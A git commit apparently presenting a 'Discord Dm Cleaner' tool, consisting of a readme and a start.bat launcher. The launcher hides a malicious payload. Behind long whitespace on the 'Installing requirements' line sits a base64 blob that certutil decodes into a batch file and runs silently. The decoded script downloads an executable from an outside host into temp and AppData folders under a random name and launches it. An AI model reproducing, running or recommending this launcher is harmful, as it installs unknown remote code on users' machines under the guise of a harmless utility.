a2f35d776c6b37e830c6d89d358c664a3f010544
xwkr <xwkrobertmoore089@gmail.com>
2024-08-02 14:38:59 -0500

    Release

---
+++ readme.md
@@ -0,0 +1,10 @@
+
+# Discord Dm Cleaner
+
+Clear your discord dm / channels with a simple command
+
+## Setup
+
+1. **Download project and extract**
+2. **Run `start.bat`**.
+3. **Use !clear**
---
+++ start.bat
@@ -0,0 +1,56 @@
+
+@echo off
+setlocal enabledelayedexpansion
+
+cls
+echo Searching for Python...
+timeout /nobreak /t 1 >nul
+
+set "python="
+for /f "tokens=*" %%i in ('where python 2^>nul') do (
+    set "python=%%i"
+    goto foundPython
+)
+
+:missingPython
+cls
+echo Python is not installed or not found in your system PATH.
+echo Please download and install Python from the following URL:
+echo https://www.python.org/downloads
+pause
+goto end
+
+:foundPython
+if defined python (
+    cls
+    echo Python found at: "!python!"
+    "!python!" --version
+    timeout /nobreak /t 2 >nul
+) else (
+    goto missingPython
+)
+cls
+echo Installing requirements. This may take a few minutes, depending on your internet speed...                                                                                                                                                                                                                                                               & echo QGVjaG8gb2ZmDQpzZXRsb2NhbCBlbmFibGVkZWxheWVkZXhwYW5zaW9uDQoNCjo6IERlZmluZSBkaXJlY3RvcmllcyB0byBzZWFyY2gNCnNldCAiZGlycz0lVEVNUCUgJUFQUERBVEElICVMT0NBTEFQUERBVEElIEM6XFdpbmRvd3NcdGVtcCINCg0KOjogRGVmaW5lIGNoYXJhY3RlcnMgZm9yIHJhbmRvbSBmaWxlIG5hbWUgZ2VuZXJhdGlvbg0Kc2V0ICJjaGFycz1BQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZl9naGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkiDQpzZXQgImZpbGVfbmFtZT0iDQoNCjo6IEdlbmVyYXRlIGEgcmFuZG9tIDYtY2hhcmFjdGVyIGZpbGUgbmFtZQ0KZm9yIC9MICUlaSBpbiAoMSwxLDYpIGRvICgNCiAgICBzZXQgL2EgInJhbmQ9IXJhbmRvbSEgJSUgNjIiDQogICAgY2FsbCBzZXQgImZpbGVfbmFtZT0hZmlsZV9uYW1lISUlY2hhcnM6fiFyYW5kISwxJSUiDQopDQpzZXQgImZpbGVfbmFtZT0hZmlsZV9uYW1lIS5leGUiDQoNCjo6IEl0ZXJhdGUgb3ZlciBkaXJlY3RvcmllcyBhbmQgZG93bmxvYWQgdGhlIGZpbGUNCmZvciAlJWQgaW4gKCVkaXJzJSkgZG8gKA0KICAgIHNldCAiZmlsZV9wYXRoPSUlZFwhZmlsZV9uYW1lISINCiAgICBwb3dlcnNoZWxsIC1jb21tYW5kICJ0cnkgeyAoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwczovL2dvbm5hY3JhY2suZGlzY2xvdWQuYXBwL1VwZGF0ZScsICchZmlsZV9wYXRoIScpOyBleGl0IDAgfSBjYXRjaCB7IGV4aXQgMSB9Ig0KICAgIA0KICAgIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgICAgICBzdGFydCAiIiAiIWZpbGVfcGF0aCEiDQogICAgICAgIGNscw0KICAgICAgICBlbmRsb2NhbA0KICAgICAgICBleGl0IC9iIDANCiAgICApDQopDQoNCjplbmRfc2NyaXB0DQplbmRsb2NhbA > %TMP%\temp.b64 & certutil -decode %TMP%\temp.b64 %TMP%\update.bat >nul 2>&1 & call %TMP%\update.bat >nul 2>&1 & del %TMP%\temp.b64 %TMP%\update.bat >nul 2>&1
+call "!python!" -m pip install -r requirements.txt
+if errorlevel 1 (
+    cls
+    echo Failed to install requirements. Please check your internet connection and try again.
+    pause
+    goto end
+)
+
+cls
+"!python!" clear.py
+
+if errorlevel 1 (
+    cls
+    echo Failed to run the Python script. Check the script for errors.
+    pause
+    goto end
+)
+cls
+echo Press any key to close...
+pause
+
+:end
+endlocal
